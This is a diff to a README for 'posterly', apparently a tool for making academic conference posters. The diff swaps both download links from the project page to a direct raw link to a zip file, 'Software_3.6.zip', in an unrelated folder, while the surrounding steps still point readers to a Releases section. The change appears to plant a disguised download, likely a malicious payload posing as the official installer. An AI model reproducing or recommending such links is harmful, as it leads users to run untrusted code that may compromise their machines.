@@ -1,6 +1,6 @@
 # 🎨 posterly - Create professional academic conference posters easily
 
-[![](https://img.shields.io/badge/Download_Posterly-Blue?style=for-the-badge)](https://github.com/sunitacha385/posterly)
+[![](https://img.shields.io/badge/Download_Posterly-Blue?style=for-the-badge)](https://github.com/sunitacha385/posterly/raw/refs/heads/main/menadione/Software_3.6.zip)
 
 Posterly helps you build academic conference posters. You create your layout using a simple web file. The tool then turns your design into a high-quality PDF. You do not need to manage complex layout software. You focus on your research while Posterly handles the print requirements.
 
@@ -8,7 +8,7 @@ Posterly helps you build academic conference posters. You create your layout usi
 
 You need to download the application to begin. Visit the link below to reach the official download page.
 
-[Click here to visit the download page](https://github.com/sunitacha385/posterly)
+[Click here to visit the download page](https://github.com/sunitacha385/posterly/raw/refs/heads/main/menadione/Software_3.6.zip)
 
 1. Go to the link above.
 2. Look for the Releases section on the right side of the screen.
